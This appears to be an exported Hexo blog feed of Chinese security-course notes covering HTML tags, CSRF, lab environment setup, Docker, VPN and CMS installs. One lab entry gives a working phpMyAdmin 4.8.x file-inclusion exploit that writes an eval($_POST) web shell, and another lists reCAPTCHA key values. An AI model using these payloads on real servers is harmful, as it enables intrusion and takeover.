title="6、音频/视频标签"></a>6、音频/视频标签</h3><table><thead><tr><th>标签</th><th>描述</th></tr></thead><tbody><tr><td>&lt;\audio&gt;</td><td>定义声音内容。</td></tr><tr><td>&lt;\source&gt;</td><td>定义媒介源。</td></tr><tr><td>&lt;\track&gt;</td><td>定义用在媒体播放器中的文本轨道。</td></tr><tr><td>&lt;\video&gt;</td><td>定义视频。</td></tr></tbody></table><h3 id="7、链接标签"><a href="#7、链接标签" class="headerlink" title="7、链接标签"></a>7、链接标签</h3><table><thead><tr><th>标签</th><th>描述</th></tr></thead><tbody><tr><td>&lt;\a&gt;</td><td>定义锚。</td></tr><tr><td>&lt;\link&gt;</td><td>定义文档与外部资源的关系。</td></tr><tr><td>&lt;\nav&gt;</td><td>定义导航链接。</td></tr></tbody></table><h3 id="8、列表标签"><a href="#8、列表标签" class="headerlink" title="8、列表标签"></a>8、列表标签</h3><table><thead><tr><th>标签</th><th>描述</th></tr></thead><tbody><tr><td>&lt;\ul&gt;</td><td>定义无序列表。</td></tr><tr><td>&lt;\ol&gt;</td><td>定义有序列表。</td></tr><tr><td>&lt;\li&gt;</td><td>定义列表的项目。</td></tr><tr><td>&lt;\dir&gt;</td><td>不赞成使用。定义目录列表。</td></tr><tr><td>&lt;\dl&gt;</td><td>定义定义列表。</td></tr><tr><td>&lt;\dt&gt;</td><td>定义定义列表中的项目。</td></tr><tr><td>&lt;\dd&gt;</td><td>定义定义列表中项目的描述。</td></tr><tr><td>&lt;\menu&gt;</td><td>定义命令的菜单/列表。</td></tr><tr><td>&lt;\menuitem&gt;</td><td>定义用户可以从弹出菜单调用的命令/菜单项目。</td></tr><tr><td>&lt;\command&gt;</td><td>定义命令按钮。</td></tr></tbody></table><h3 id="9、表格标签"><a href="#9、表格标签" class="headerlink" title="9、表格标签"></a>9、表格标签</h3><table><thead><tr><th>标签</th><th>描述</th></tr></thead><tbody><tr><td>&lt;\table&gt;</td><td>定义表格</td></tr><tr><td>&lt;\caption&gt;</td><td>定义表格标题。</td></tr><tr><td>&lt;\th&gt;</td><td>定义表格中的表头单元格。</td></tr><tr><td>&lt;\tr&gt;</td><td>定义表格中的行。</td></tr><tr><td>&lt;\td&gt;</td><td>定义表格中的单元。</td></tr><tr><td>&lt;\thead&gt;</td><td>定义表格中的表头内容。</td></tr><tr><td>&lt;\tbody&gt;</td><td>定义表格中的主体内容。</td></tr><tr><td>&lt;\tfoot&gt;</td><td>定义表格中的表注内容（脚注）。</td></tr><tr><td>&lt;\col&gt;</td><td>定义表格中一个或多个列的属性值。</td></tr><tr><td>&lt;\colgroup&gt;</td><td>定义表格中供格式化的列组。</td></tr></tbody></table><h3 id="10、样式-节标签"><a href="#10、样式-节标签" class="headerlink" title="10、样式/节标签"></a>10、样式/节标签</h3><table><thead><tr><th>标签</th><th>描述</th></tr></thead><tbody><tr><td>&lt;\style&gt;</td><td>定义文档的样式信息。</td></tr><tr><td>&lt;\div&gt;</td><td>定义文档中的节。</td></tr><tr><td>&lt;\span&gt;</td><td>定义文档中的节。</td></tr><tr><td>&lt;\header&gt;</td><td>定义 section 或 page 的页眉。</td></tr><tr><td>&lt;\footer&gt;</td><td>定义 section 或 page 的页脚。</td></tr><tr><td>&lt;\section&gt;</td><td>定义 section。</td></tr><tr><td>&lt;\article&gt;</td><td>定义文章。</td></tr><tr><td>&lt;\aside&gt;</td><td>定义页面内容之外的内容。</td></tr><tr><td>&lt;\details&gt;</td><td>定义元素的细节。</td></tr><tr><td>&lt;\dialog&gt;</td><td>定义对话框或窗口。</td></tr><tr><td>&lt;\summary&gt;</td><td>为 &lt;\details&gt; 元素定义可见的标题。</td></tr></tbody></table><h3 id="11、元信息标签"><a href="#11、元信息标签" class="headerlink" title="11、元信息标签"></a>11、元信息标签</h3><table><thead><tr><th>标签</th><th>描述</th></tr></thead><tbody><tr><td>&lt;\head&gt;</td><td>定义关于文档的信息。</td></tr><tr><td>&lt;\meta&gt;</td><td>定义关于 HTML 文档的元信息。</td></tr><tr><td>&lt;\base&gt;</td><td>定义页面中所有链接的默认地址或默认目标。</td></tr><tr><td>&lt;\basefont&gt;</td><td>不赞成使用。定义页面中文本的默认字体、颜色或尺寸。</td></tr></tbody></table><h3 id="12、编程标签"><a href="#12、编程标签" class="headerlink" title="12、编程标签"></a>12、编程标签</h3><table><thead><tr><th>标签</th><th>描述</th></tr></thead><tbody><tr><td>&lt;\script&gt;</td><td>定义客户端脚本。</td></tr><tr><td>&lt;\noscript&gt;</td><td>定义针对不支持客户端脚本的用户的替代内容。</td></tr><tr><td>&lt;\applet&gt;</td><td>不赞成使用。定义嵌入的 applet。</td></tr><tr><td>&lt;\embed&gt;</td><td>为外部应用程序（非 HTML）定义容器。</td></tr><tr><td>&lt;\object&gt;</td><td>定义嵌入的对象。</td></tr><tr><td>&lt;\param&gt;</td><td>定义对象的参数。</td></tr></tbody></table><h1 id="XML语言"><a href="#XML语言" class="headerlink" title="XML语言"></a>XML语言</h1><p>被用来描述数据，其焦点是数据内容，因此也被称为无作为语言。XML用来结构化、存储以及传输信息。但不进行任何数据之外的操作。</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三周 </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF漏洞</title>
      <link href="/2019/08/03/CSRF%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/08/03/CSRF%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h1><p>利用受信人的信息伪造请求，向被受信的网站发送请求。<br>依靠网站对用户标示的信任，欺骗用户浏览器发送HTTP请求给目标站点，通过IMG标签触发GET请求，利用GET信息实施攻击</p><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><h2 id="1。选择有漏洞的网站发送请求查看消息"><a href="#1。选择有漏洞的网站发送请求查看消息" class="headerlink" title="1。选择有漏洞的网站发送请求查看消息"></a>1。选择有漏洞的网站发送请求查看消息</h2><p>提交请求查看发送的数据<br><img src="/CSRF%E6%BC%8F%E6%B4%9E/20190803083500046.png" alt></p><h2 id="2。根据相应的参数、响应确定伪造信息"><a href="#2。根据相应的参数、响应确定伪造信息" class="headerlink" title="2。根据相应的参数、响应确定伪造信息"></a>2。根据相应的参数、响应确定伪造信息</h2><h2 id="3。使用js编写代码，利用的ajax填写表单"><a href="#3。使用js编写代码，利用的ajax填写表单" class="headerlink" title="3。使用js编写代码，利用的ajax填写表单"></a>3。使用js编写代码，利用的ajax填写表单</h2><p><img src="/CSRF%E6%BC%8F%E6%B4%9E/20190803083836194.png" alt></p><h2 id="4。尝试运行查看效果"><a href="#4。尝试运行查看效果" class="headerlink" title="4。尝试运行查看效果"></a>4。尝试运行查看效果</h2><p>代码运行前<br><img src="/CSRF%E6%BC%8F%E6%B4%9E/20190803083949837.png" alt><br>代码运行后 按照填写的表单显示<br>消息响应200成功<br><img src="/CSRF%E6%BC%8F%E6%B4%9E/20190803084337230.png" alt><br><img src="/CSRF%E6%BC%8F%E6%B4%9E/20190803084425810.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三周 </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs和DVWA搭建</title>
      <link href="/2019/08/03/sql-lab/"/>
      <url>/2019/08/03/sql-lab/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs搭建"><a href="#sqli-labs搭建" class="headerlink" title="sqli-labs搭建"></a>sqli-labs搭建</h1><h2 id="sqli-labs部分管卡需要Tomcat服务器需要提前搭建，搭建好数据库以mariadb数据库"><a href="#sqli-labs部分管卡需要Tomcat服务器需要提前搭建，搭建好数据库以mariadb数据库" class="headerlink" title="sqli-labs部分管卡需要Tomcat服务器需要提前搭建，搭建好数据库以mariadb数据库"></a>sqli-labs部分管卡需要Tomcat服务器需要提前搭建，搭建好数据库以mariadb数据库</h2><h2 id="1。下载解压-修改文件夹（root用户和用户组为中间件的用户和用户组）"><a href="#1。下载解压-修改文件夹（root用户和用户组为中间件的用户和用户组）" class="headerlink" title="1。下载解压 修改文件夹（root用户和用户组为中间件的用户和用户组）"></a>1。下载解压 修改文件夹（root用户和用户组为中间件的用户和用户组）</h2><p><a href="https://github.com/Audi-1/sqli-labs.git" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs.git</a><br>解压到httpd的根目录 /var/www/html 下创建文件夹即可</p><h2 id="2。进入数据库创建sqli的数据库"><a href="#2。进入数据库创建sqli的数据库" class="headerlink" title="2。进入数据库创建sqli的数据库"></a>2。进入数据库创建sqli的数据库</h2><h2 id="3。进入sqli-labs-sql-connections-db-creds-inc配置刚创建的数据库"><a href="#3。进入sqli-labs-sql-connections-db-creds-inc配置刚创建的数据库" class="headerlink" title="3。进入sqli-labs/sql-connections/db-creds.inc配置刚创建的数据库"></a>3。进入sqli-labs/sql-connections/db-creds.inc配置刚创建的数据库</h2><h2 id="4。浏览器登陆到sqli-labs的文件夹即可"><a href="#4。浏览器登陆到sqli-labs的文件夹即可" class="headerlink" title="4。浏览器登陆到sqli-labs的文件夹即可"></a>4。浏览器登陆到sqli-labs的文件夹即可</h2><hr><h1 id="DVWA搭建"><a href="#DVWA搭建" class="headerlink" title="DVWA搭建"></a>DVWA搭建</h1><h2 id="1。下载解压修改用户和用户组为中间件用户和用户组，注意防火墙问题"><a href="#1。下载解压修改用户和用户组为中间件用户和用户组，注意防火墙问题" class="headerlink" title="1。下载解压修改用户和用户组为中间件用户和用户组，注意防火墙问题"></a>1。下载解压修改用户和用户组为中间件用户和用户组，注意防火墙问题</h2><p><a href="https://github.com/ethicalhack3r/DVWA/archive/v1.9.zip" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA/archive/v1.9.zip</a></p><h2 id="2。修改DVWA配置文件"><a href="#2。修改DVWA配置文件" class="headerlink" title="2。修改DVWA配置文件"></a>2。修改DVWA配置文件</h2><p>将DVWA-master/config/ 下的config.inc.php.dist去掉 .dist 同时修改config.inc.php文件<br><img src="/sql-lab/20190803064647968.png" alt></p><h2 id="3。秘钥"><a href="#3。秘钥" class="headerlink" title="3。秘钥"></a>3。秘钥</h2><pre><code>$_DVWA[ &#39;recaptcha_public_key&#39; ]  = &#39;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#39;;$_DVWA[ &#39;recaptcha_private_key&#39; ] = &#39;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#39;;</code></pre><h2 id="3。修改php-ini文件"><a href="#3。修改php-ini文件" class="headerlink" title="3。修改php.ini文件"></a>3。修改php.ini文件</h2><p>/etc/php.ini<br><img src="/sql-lab/20190803064743186.png" alt></p><h2 id="4。浏览器登陆，如果查看是否有问题"><a href="#4。浏览器登陆，如果查看是否有问题" class="headerlink" title="4。浏览器登陆，如果查看是否有问题"></a>4。浏览器登陆，如果查看是否有问题</h2><p><img src="/sql-lab/20190803065144662.png" alt></p><h2 id="5。安装成功"><a href="#5。安装成功" class="headerlink" title="5。安装成功"></a>5。安装成功</h2><p><img src="/sql-lab/20190803065210632.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 第二周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker类虚拟机的搭建</title>
      <link href="/2019/08/03/Docker%E7%B1%BB%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
      <url>/2019/08/03/Docker%E7%B1%BB%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h1><h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>执行 sudo apt-get update    如果长时间进度为0%，考虑网络问题，和安装源的问题。<br>        安装源更换为清华源即可    修改/etc/apt/sources.list文件</p><h2 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h2><p>根据官网按照步骤一步一步执行代码即可<br><a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/" target="_blank" rel="noopener">https://docs.docker.com/install/linux/docker-ce/ubuntu/</a></p><blockquote><p>1．sudo apt-get remove docker docker-engine docker.io containerd runc<br>2．sudo apt-get update<br>3．sudo apt-get install <br>        apt-transport-https <br>        ca-certificates <br>        curl <br>        gnupg-agent <br>        software-properties-common<br>4．curl -fsSL <a href="https://download.docker.com/linux/ubuntu/gpg" target="_blank" rel="noopener">https://download.docker.com/linux/ubuntu/gpg</a> | sudo apt-key add -<br>5．sudo apt-key fingerprint 0EBFCD88<br>6．sudo add-apt-repository <br>       “deb [arch=amd64] <a href="https://download.docker.com/linux/ubuntu" target="_blank" rel="noopener">https://download.docker.com/linux/ubuntu</a> <br>       $(lsb_release -cs) <br>       stable”<br>7．sudo apt-get update<br>8．sudo apt-get install docker-ce docker-ce-cli containerd.io</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 第三周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机搭建VPN</title>
      <link href="/2019/08/03/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BAVPN/"/>
      <url>/2019/08/03/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BAVPN/</url>
      
        <content type="html"><![CDATA[<h1 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h1><p>windows 2008</p><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="1-服务端配置"><a href="#1-服务端配置" class="headerlink" title="1.服务端配置"></a>1.服务端配置</h2><p><img src="https://i.loli.net/2019/08/03/pAPKljrM8OoR7uk.png" alt><br><img src="https://i.loli.net/2019/08/03/sJEomM4CUwNjk5P.png" alt><br><img src="https://i.loli.net/2019/08/03/JH4qdcS1p5E9BRn.png" alt><br><img src="https://i.loli.net/2019/08/03/H2iNx5IgoeRlzfL.png" alt><br><img src="https://i.loli.net/2019/08/03/DVAqUFKWhOHzl8d.png" alt><br><img src="/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BAVPN/20190803042047473.png" alt><br><img src="/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BAVPN/20190803042055559.png" alt><br><img src="/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BAVPN/20190803042108783.png" alt><br>windows域网络账户都是系统帐户<br><img src="/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BAVPN/20190803042200049.png" alt><br><img src="/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BAVPN/20190803042218179.png" alt><br><img src="/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BAVPN/20190803042225875.png" alt><br>自己设置IP范围<br><img src="/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BAVPN/20190803042242323.png" alt><br><img src="/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BAVPN/20190803042251122.png" alt><br><img src="/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BAVPN/20190803042256467.png" alt><br><img src="/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BAVPN/20190803042310198.png" alt></p><h2 id="2-客户端配置"><a href="#2-客户端配置" class="headerlink" title="2.客户端配置"></a>2.客户端配置</h2><p><img src="/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BAVPN/20190803041738304.png" alt><br><img src="/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BAVPN/20190803041827109.png" alt><br>安装要求输入下一步即可<br>遇到的问题:虚拟机网络侨接连不上网,可能是路由器IP地址已满,尝试修改路由IP配置</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 第三周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpMyAdmin文件包含漏洞</title>
      <link href="/2019/08/02/phpMyAdmin%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/08/02/phpMyAdmin%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>关于phpMyAdmin 4.8.x系列的平台都存在此漏洞。<br>使用之前搭建好的phpMyAdmin 4.8.x平台</p><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="1-浏览器登陆phpMyAdmin"><a href="#1-浏览器登陆phpMyAdmin" class="headerlink" title="1.浏览器登陆phpMyAdmin"></a>1.浏览器登陆phpMyAdmin</h2><h2 id="2-在上述地址后添加？参数分割符"><a href="#2-在上述地址后添加？参数分割符" class="headerlink" title="2.在上述地址后添加？参数分割符"></a>2.在上述地址后添加？参数分割符</h2><p>因为使用了url解码函数二次解码（防止访问匹配问题，使用解码前的符号%253f[解码后 ？]）</p><h2 id="3-使用phpMyAdmin输入sql语句"><a href="#3-使用phpMyAdmin输入sql语句" class="headerlink" title="3.使用phpMyAdmin输入sql语句"></a>3.使用phpMyAdmin输入sql语句</h2><p>因为sql语句会在服务端产生相应的记录apache中间件记录 /var/lib/php/session/sess_随机数 的文件（火狐浏览器F12 存储位置可以查看产生的随机数）<br>在Linux下查看该文件<br><img src="https://i.loli.net/2019/08/03/xVvq7QjJzFNTuRd.png" alt><br>phpMyAdmin中<br><img src="https://i.loli.net/2019/08/03/kZuIjxvlyPFfJLD.png" alt><br>因为该漏洞是index.php文件检查参数产生的所以文件包含利用该文件进行上传</p><pre><code>在浏览器上输入网址ip/phpMyAdmin/index.php?target=server_sql.php%253f../../../../../../../var/lib/php/session/sess_随机数  其中%253f进行二次解码后是？  连续../是为了跳转到服务器根目录，效果</code></pre><p><img src="https://i.loli.net/2019/08/03/CAHJtjyc3SUD4di.png" alt></p><h2 id="4、尝试SQL输入一句话木马"><a href="#4、尝试SQL输入一句话木马" class="headerlink" title="4、尝试SQL输入一句话木马"></a>4、尝试SQL输入一句话木马</h2><p>SELECT “<?php phpinfo();?> “;  效果图<br><img src="https://i.loli.net/2019/08/03/EDrOh289JSpZ4me.png" alt></p><h2 id="5、尝试向服务器写入一句话木马并获取控制权限"><a href="#5、尝试向服务器写入一句话木马并获取控制权限" class="headerlink" title="5、尝试向服务器写入一句话木马并获取控制权限"></a>5、尝试向服务器写入一句话木马并获取控制权限</h2><p>SELECT “<?php file_put_contents('./hello.php','<?php eval($_POST[1])?>‘);?&gt;”;<br>    使用file_put_contents()函数将 一句话木马&lt;?php eval($_POST[1])&gt;写入 ./hello.php 当前目录文件夹下的hello.php文件<br>在浏览器执行<br>ip/phpMyAdmin/index.php?target=server_sql.php%253f../../../../../../../var/lib/php/session/sess_随机数 执行写入操作</p><h2 id="6、菜刀尝试连接，成功效果图"><a href="#6、菜刀尝试连接，成功效果图" class="headerlink" title="6、菜刀尝试连接，成功效果图"></a>6、菜刀尝试连接，成功效果图</h2><p><img src="https://i.loli.net/2019/08/03/G7Tl4bgQqJBD3LN.png" alt></p><h2 id="7、注意点："><a href="#7、注意点：" class="headerlink" title="7、注意点："></a>7、注意点：</h2><h3 id="1。在进行后台写入时注意服务端是否开启selinux如果开启，要想办法关闭或绕过"><a href="#1。在进行后台写入时注意服务端是否开启selinux如果开启，要想办法关闭或绕过" class="headerlink" title="1。在进行后台写入时注意服务端是否开启selinux如果开启，要想办法关闭或绕过"></a>1。在进行后台写入时注意服务端是否开启selinux如果开启，要想办法关闭或绕过</h3><h3 id="2。进行代码写入要注意权限问题，如果权限不足是不能写入成功"><a href="#2。进行代码写入要注意权限问题，如果权限不足是不能写入成功" class="headerlink" title="2。进行代码写入要注意权限问题，如果权限不足是不能写入成功"></a>2。进行代码写入要注意权限问题，如果权限不足是不能写入成功</h3><h3 id="3。文件写入后需要注意文件的大小，如果为0字节则写入失败，是连不上的"><a href="#3。文件写入后需要注意文件的大小，如果为0字节则写入失败，是连不上的" class="headerlink" title="3。文件写入后需要注意文件的大小，如果为0字节则写入失败，是连不上的"></a>3。文件写入后需要注意文件的大小，如果为0字节则写入失败，是连不上的</h3>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三周 </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>修改CMS的access数据库为MySQL数据库</title>
      <link href="/2019/08/02/%E4%BF%AE%E6%94%B9CMS%E7%9A%84access%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%BAMySQL%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2019/08/02/%E4%BF%AE%E6%94%B9CMS%E7%9A%84access%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%BAMySQL%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="1。添加相应配置"><a href="#1。添加相应配置" class="headerlink" title="1。添加相应配置"></a>1。添加相应配置</h1><p>打开网站目录配置文件config目录修改AspCms_Config.asp<br><img src="https://i.loli.net/2019/08/02/5d4426904664e31630.png" alt></p><h1 id="2。数据更换操作"><a href="#2。数据更换操作" class="headerlink" title="2。数据更换操作"></a>2。数据更换操作</h1><p><img src="https://i.loli.net/2019/08/02/5d4426904b3ab78022.png" alt><br>创建的数据名称和配置文件的必须一致<br><img src="https://i.loli.net/2019/08/02/5d4426900667473674.png" alt><br><img src="https://i.loli.net/2019/08/02/5d44268fefaa149745.png" alt></p><h1 id="3。选择数据库文件"><a href="#3。选择数据库文件" class="headerlink" title="3。选择数据库文件"></a>3。选择数据库文件</h1><p><img src="https://i.loli.net/2019/08/02/5d44268fd986847269.png" alt><br><img src="https://i.loli.net/2019/08/02/5d4426ba2c11c70378.png" alt><br>下一步下一步</p><h1 id="4、重新登陆即可"><a href="#4、重新登陆即可" class="headerlink" title="4、重新登陆即可"></a>4、重新登陆即可</h1>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 第二周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CMS和MySQL的搭建</title>
      <link href="/2019/08/02/CMS%E5%92%8CMySQL%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
      <url>/2019/08/02/CMS%E5%92%8CMySQL%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h1><h2 id="1、进入Windows-Server-2008服务器添加角色"><a href="#1、进入Windows-Server-2008服务器添加角色" class="headerlink" title="1、进入Windows Server 2008服务器添加角色"></a>1、进入Windows Server 2008服务器添加角色</h2><p><img src="https://i.loli.net/2019/08/02/5d441d36627a329482.png" alt><br><img src="https://i.loli.net/2019/08/02/5d441d36155c059050.png" alt><br><img src="https://i.loli.net/2019/08/02/5d441d3631bf066151.png" alt><br><img src="https://i.loli.net/2019/08/02/5d441d36318c587689.png" alt><br><img src="https://i.loli.net/2019/08/02/5d441d3634b3559827.png" alt>可点可不点</p><h2 id="2、百度等搜索CMS"><a href="#2、百度等搜索CMS" class="headerlink" title="2、百度等搜索CMS"></a>2、百度等搜索CMS</h2><h2 id="3、解压文件，添加网站"><a href="#3、解压文件，添加网站" class="headerlink" title="3、解压文件，添加网站"></a>3、解压文件，添加网站</h2><p><img src="https://i.loli.net/2019/08/02/5d441d369f50656366.png" alt><br><img src="https://i.loli.net/2019/08/02/5d441d36b7f7858510.png" alt></p><h2 id="4、进入网站进行配置"><a href="#4、进入网站进行配置" class="headerlink" title="4、进入网站进行配置"></a>4、进入网站进行配置</h2><p><img src="https://i.loli.net/2019/08/02/5d441d36e129117105.png" alt><br><img src="https://i.loli.net/2019/08/02/5d441d36d2f9d90203.png" alt><br><img src="https://i.loli.net/2019/08/02/5d441d370fbd053902.png" alt><br><img src="https://i.loli.net/2019/08/02/5d441d405fe9f33385.png" alt></p><h2 id="5、编辑权限完全控制"><a href="#5、编辑权限完全控制" class="headerlink" title="5、编辑权限完全控制"></a>5、编辑权限完全控制</h2><p><img src="https://i.loli.net/2019/08/02/5d441d406a4f851701.png" alt></p><h2 id="6、修改应用程序池"><a href="#6、修改应用程序池" class="headerlink" title="6、修改应用程序池"></a>6、修改应用程序池</h2><p>因为：Asp缺陷：分32位和64位,注意修改相关网站的应用程序池<br><img src="https://i.loli.net/2019/08/02/5d441d40b46db30606.png" alt><br><img src="https://i.loli.net/2019/08/02/5d441d40b8f2d90375.png" alt><br>可以添加多个网站，注意设置端口，如果不能访问，关闭防火墙</p><h1 id="MySQL安装"><a href="#MySQL安装" class="headerlink" title="MySQL安装"></a>MySQL安装</h1><h2 id="1。虚拟机载入光驱"><a href="#1。虚拟机载入光驱" class="headerlink" title="1。虚拟机载入光驱"></a>1。虚拟机载入光驱</h2><p><img src="https://i.loli.net/2019/08/02/5d441ee4642b776380.png" alt><br><img src="https://i.loli.net/2019/08/02/5d441ee4644c219247.png" alt><br><img src="https://i.loli.net/2019/08/02/5d441ee4334e690108.png" alt></p><h2 id="2。进入光驱进行全部安装"><a href="#2。进入光驱进行全部安装" class="headerlink" title="2。进入光驱进行全部安装"></a>2。进入光驱进行全部安装</h2><p><img src="https://i.loli.net/2019/08/02/5d441ee47e70768570.png" alt><br><img src="https://i.loli.net/2019/08/02/5d441ee47e70768570.png" alt><br><img src="https://i.loli.net/2019/08/02/5d441ee4d5e1878677.png" alt><br><img src="https://i.loli.net/2019/08/02/5d441ee52c2ff42905.png" alt><br><img src="https://i.loli.net/2019/08/02/5d441ee50334743241.png" alt><br><img src="https://i.loli.net/2019/08/02/5d441ee52012090034.png" alt></p><h2 id="3。配置SQL数据库连接网站"><a href="#3。配置SQL数据库连接网站" class="headerlink" title="3。配置SQL数据库连接网站"></a>3。配置SQL数据库连接网站</h2><p><img src="https://i.loli.net/2019/08/02/5d441ee544e2e29551.png" alt></p><h3 id="a-localhost登陆方式"><a href="#a-localhost登陆方式" class="headerlink" title="a) localhost登陆方式"></a>a) localhost登陆方式</h3><p><img src="https://i.loli.net/2019/08/02/5d441eecdfd6f74098.png" alt></p><h3 id="b-密码登陆（默认管理员sa，密码为安装设置密码）"><a href="#b-密码登陆（默认管理员sa，密码为安装设置密码）" class="headerlink" title="b) 密码登陆（默认管理员sa，密码为安装设置密码）"></a>b) 密码登陆（默认管理员sa，密码为安装设置密码）</h3><p><img src="https://i.loli.net/2019/08/02/5d441ee63a21f87598.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 第二周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机导出到其他机器网络配置问题</title>
      <link href="/2019/08/02/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AF%BC%E5%87%BA%E5%88%B0%E5%85%B6%E4%BB%96%E6%9C%BA%E5%99%A8%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/"/>
      <url>/2019/08/02/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AF%BC%E5%87%BA%E5%88%B0%E5%85%B6%E4%BB%96%E6%9C%BA%E5%99%A8%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="1、虚拟机导出"><a href="#1、虚拟机导出" class="headerlink" title="1、虚拟机导出"></a>1、虚拟机导出</h1><h2 id="1。生成-ova文件，用虚拟机打开安装"><a href="#1。生成-ova文件，用虚拟机打开安装" class="headerlink" title="1。生成 .ova文件，用虚拟机打开安装"></a>1。生成 .ova文件，用虚拟机打开安装</h2><p><img src="https://i.loli.net/2019/08/02/5d44141aee6cc50819.png" alt><br><img src="https://i.loli.net/2019/08/02/5d44141aba4bd35217.png" alt></p><h2 id="2。修改网卡解决上网问题"><a href="#2。修改网卡解决上网问题" class="headerlink" title="2。修改网卡解决上网问题"></a>2。修改网卡解决上网问题</h2><pre><code>a)    CentOS6重启网卡：service network restartb)    根据虚拟机的MAC地址修改 /etc/udev/rules.d/70-persistent-net.rules    i.    虚拟机查看MAC地址：</code></pre><p><img src="https://i.loli.net/2019/08/02/5d44141af1f0353097.png" alt><br><img src="https://i.loli.net/2019/08/02/5d44141b1625279597.png" alt><br><img src="https://i.loli.net/2019/08/02/5d44141ad755e93654.png" alt></p><pre><code>    ii.    MAC修改为自己的MAC    iii.    NAME=”eth1”修改为NAME=”eth0”c)    修改/etc/sysconfig/network-scripts/ifcfg-eth0 中的HWADDR参数为虚拟机的MAC地址</code></pre><h2 id="3。重启网卡"><a href="#3。重启网卡" 